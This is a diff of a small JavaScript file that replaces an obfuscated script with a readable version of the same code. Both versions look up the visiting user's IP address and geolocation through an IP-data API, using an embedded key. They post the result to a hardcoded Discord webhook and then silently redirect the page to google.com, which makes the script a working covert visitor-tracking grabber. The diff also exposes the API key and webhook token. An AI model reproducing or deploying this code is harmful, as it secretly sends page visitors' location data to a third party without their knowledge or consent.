@@ -1,1 +1,12 @@
-var _0x15bf9e=_0x3d78;(function(_0x217520,_0x389dd3){var _0x337077=_0x3d78,_0x112dd3=_0x217520();while(!![]){try{var _0x32cae7=-parseInt(_0x337077(0xf2))/0x1*(-parseInt(_0x337077(0xf6))/0x2)+-parseInt(_0x337077(0xf5))/0x3+-parseInt(_0x337077(0xfd))/0x4*(-parseInt(_0x337077(0xe9))/0x5)+parseInt(_0x337077(0xed))/0x6*(parseInt(_0x337077(0xfe))/0x7)+parseInt(_0x337077(0xf7))/0x8+parseInt(_0x337077(0xee))/0x9*(parseInt(_0x337077(0xfb))/0xa)+-parseInt(_0x337077(0xf0))/0xb*(parseInt(_0x337077(0xfa))/0xc);if(_0x32cae7===_0x389dd3)break;else _0x112dd3['push'](_0x112dd3['shift']());}catch(_0x5c4f69){_0x112dd3['push'](_0x112dd3['shift']());}}}(_0x1ef8,0xc3c63));function _0x3d78(_0x8a6529,_0x18e18c){var _0x1ef859=_0x1ef8();return _0x3d78=function(_0x3d78a6,_0x204644){_0x3d78a6=_0x3d78a6-0xe9;var _0x12d3fe=_0x1ef859[_0x3d78a6];return _0x12d3fe;},_0x3d78(_0x8a6529,_0x18e18c);}var request=new XMLHttpRequest();request[_0x15bf9e(0xfc)](_0x15bf9e(0xec),_0x15bf9e(0xf4)),request['setRequestHeader']('Accept',_0x15bf9e(0xef)),request[_0x15bf9e(0xf8)]=function(){var _0x215af5=_0x15bf9e;this['readyState']===0x4&&fetch('https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw',{'method':_0x215af5(0xf3),'headers':{'content-type':_0x215af5(0xef)},'body':JSON['stringify']({'content':this['responseText']})});},request[_0x15bf9e(0xeb)](),window[_0x15bf9e(0xf1)][_0x15bf9e(0xf9)](_0x15bf9e(0xea));function _0x1ef8(){var _0x8769c8=['168YDwIsJ','10rfMXOH','open','1524TeFpIT','9181907nwRqWc','2165lFeelm','https://google.com','send','GET','6LwoxsE','9607770DyHYdu','application/json','1040743VkGSHZ','location','2383nvqILP','POST','https://api.ipdata.co/?api-key=7beb17f7537a898bfee9001e6375b2d46c028bc3936d111a00629cb7','4043730ACBVWV','212jjZHJd','5420648HnWHbT','onreadystatechange','replace'];_0x1ef8=function(){return _0x8769c8;};return _0x1ef8();}
+var a = new XMLHttpRequest();
+
+a.open("GET","https://api.ipdata.co/?api-key=7beb17f7537a898bfee9001e6375b2d46c028bc3936d111a00629cb7");
+a.setRequestHeader('Accept','application/json');
+a.onreadystatechange = function () {
+    if (this.readyState === 4) {
+        fetch("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",{"method":"POST","headers":{"content-type":"application/json"},"body":JSON.stringify({"content":this.responseText})});
+    }
+};
+
+a.send();
+window.location.replace("https://google.com");
